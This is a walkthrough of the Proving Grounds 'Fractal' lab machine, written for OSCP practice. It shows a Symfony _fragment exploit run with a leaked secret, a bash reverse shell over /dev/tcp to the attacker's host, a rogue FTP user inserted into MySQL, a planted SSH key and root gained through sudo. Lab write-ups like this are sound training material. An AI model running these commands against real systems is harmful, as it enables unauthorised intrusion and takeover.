Today we will take a look at Proving grounds: Fractal. My purpose in sharing this post is to prepare for oscp exam. It is also to show you the way if you are in trouble. Please try to understand each step and take notes.

    Network scan

21/tcp open ftp?
| fingerprint-strings: 
| GenericLines: 
| 220 ProFTPD Server (Debian) [192.168.168.233]
| Invalid command: try being more creative
| Invalid command: try being more creative
| NULL: 
|_ 220 ProFTPD Server (Debian) [192.168.168.233]
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
| 3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
| 256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_ 256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/app_dev.php /app_dev.php/*

    Apache (80)

/app_dev.php

Take a look at the app_dev.php directory

Looking for a Symfony exploit.
How I was able to find multiple vulnerabilities of a Symfony Web Framework web application
Found high severity vulnerability in 5 minutes just from reconnaissance. Found multiple vulnerabilities on a web…

infosecwriteups.com
symfony-exploits/secret_fragment_exploit.py at main · ambionics/symfony-exploits
You can't perform that action at this time. You signed in with another tab or window. You signed out in another tab or…

github.com

Looking at the code I decided to use method 2.

python secret_fragment_exploit.py http://192.168.56.233/_fragment -s 48a8538e6260789558f0dfe29861c05b

python secret_fragment_exploit.py ‘http://192.168.56.233/_fragment' — method 2 — secret ‘48a8538e6260789558f0dfe29861c05b’ — algo ‘sha256’ — internal-url ‘http://192.168.56.233/_fragment' — function system — parameters ‘id’

It worked. Now let’s take the reverse shell.

python secret_fragment_exploit.py ‘http://192.168.56.233/_fragment' — method 2 — secret ‘48a8538e6260789558f0dfe29861c05b’ — algo ‘sha256’ — internal-url ‘http://192.168.56.233/_fragment' — function system — parameters “bash -c ‘bash -i >& /dev/tcp/192.168.49.168/80 0>&1’”

    benoit

If you remember the ftp port was open. So let’s look at the data. Here we got some credentials. Now let’s use them and access sql.

Now let’s create and add a user named benoit.
How To Set Up ProFTPD with a MySQL Backend on Ubuntu
Introduction

medium.com

We looked at how to create a password for ProFTPD. We will create one.

└─# /bin/echo “{md5}”`/bin/echo -n “testpass” | openssl dgst -binary -md5 | openssl enc -base64`
{md5}F5rUXGziy5fPECniEgRugQ==

mysql> INSERT INTO `ftpuser` (`id`, `userid`, `passwd`, `uid`, `gid`, `homedir`, `shell`, `count`, `accessed`, `modified`) VALUES (NULL, ‘benoit’, ‘{md5}F5rUXGziy5fPECniEgRugQ==’, ‘1000’, ‘1000’, ‘/’, ‘/bin/bash’, ‘0’, ‘2022–12–05 05:26:29’, ‘2022–12–12 05:26:29’);

We have added the user to the database. Now let’s use it and login with ftp.

└─# ftp 192.168.56.233
ftp> passive
ftp> cd /home/benoit
ftp> mkdir .ssh

Let’s create a folder and transfer a key to access with ssh

┌──(root㉿kali)-[~/ctf]
└─# ssh-keygen
┌──(root㉿kali)-[~/ctf]
└─# cp /root/.ssh/id_rsa.pub authorized_keys

ftp> cd /home/benoit/.ssh
ftp> put authorized_keys

    Privesc(ALL)

┌──(root㉿kali)-[~/ctf]
└─# ssh benoit@192.168.168.233 -i /root/.ssh/id_rsa

benoit@fractal:~$ sudo -l
Matching Defaults entries for benoit on fractal:
 env_reset, mail_badpass,
 secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User benoit may run the following commands on fractal:
 (ALL) NOPASSWD: ALL
benoit@fractal:~$ sudo su
root@fractal:/home/benoit# whoami
root

And now we are the root

“If you have any questions or comments, please do not hesitate to write. Have a good days”
